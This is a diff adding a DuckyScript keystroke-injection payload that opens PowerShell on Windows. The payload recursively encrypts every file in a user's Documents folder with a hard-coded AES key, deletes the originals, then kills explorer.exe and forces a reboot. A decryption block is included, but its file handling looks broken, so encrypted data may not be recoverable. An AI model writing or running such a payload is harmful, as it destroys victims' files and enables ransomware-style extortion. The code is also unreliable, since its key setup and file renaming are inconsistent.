@@ -1,0 +1,27 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING powershell -command "$key = 'myPassword'; $securekey = ConvertTo-SecureString $key -AsPlainText -Force; $filepath = 'C:\Users\username\Documents'; Get-ChildItem $filepath -Recurse | Foreach-Object { if(!($_.psiscontainer)) { $encrypted = $_.fullname + '.encrypted'; $decrypted = $_.fullname; $key = New-Object System.Security.Cryptography.RijndaelManaged; $key.Key = (1..32); $key.IV = (1..16); $encryptor = $key.CreateEncryptor($key.Key,$key.IV); $fsread = New-Object System.IO.FileStream($_.fullname,[System.IO.FileMode]::Open); $fswrite = New-Object System.IO.FileStream($encrypted,[System.IO.FileMode]::Create); $cryptostream = New-Object System.Security.Cryptography.CryptoStream($fswrite,$encryptor,[System.Security.Cryptography.CryptoStreamMode]::Write); $fsread.CopyTo($cryptostream); $cryptostream.Close(); $fsread.Close(); $fswrite.Close(); Remove-Item $_.fullname }; Rename-Item $encrypted $decrypted -ErrorAction Ignore }"
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -command "$key = 'myPassword'; $securekey = ConvertTo-SecureString $key -AsPlainText -Force; $filepath = 'C:\Users\username\Documents'; Get-ChildItem $filepath -Recurse | Foreach-Object { if(!($_.psiscontainer)) { $decrypted = $_.fullname; $encrypted = $_.fullname + '.encrypted'; $key = New-Object System.Security.Cryptography.RijndaelManaged; $key.Key = (1..32); $key.IV = (1..16); $decryptor = $key.CreateDecryptor($key.Key,$key.IV); $fsread = New-Object System.IO.FileStream($encrypted,[System.IO.FileMode]::Open); $fswrite = New-Object System.IO.FileStream($decrypted,[System.IO.FileMode]::Create); $cryptostream = New-Object System.Security.Cryptography.CryptoStream($fsread,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Read); $fswrite = New-Object System.IO.FileStream($decrypted,[System.IO.FileMode]::Create); $cryptostream.CopyTo($fswrite); $cryptostream.Close(); $fsread.Close(); $fswrite.Close(); Remove-Item $encrypted }; }"
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -command "Get-WmiObject -Class Win32_Process -Filter 'name = ''explorer.exe''' | ForEach-Object { $_.Terminate() }"
+ENTER
+DELAY 500
+STRING shutdown -r -t 0
+ENTER
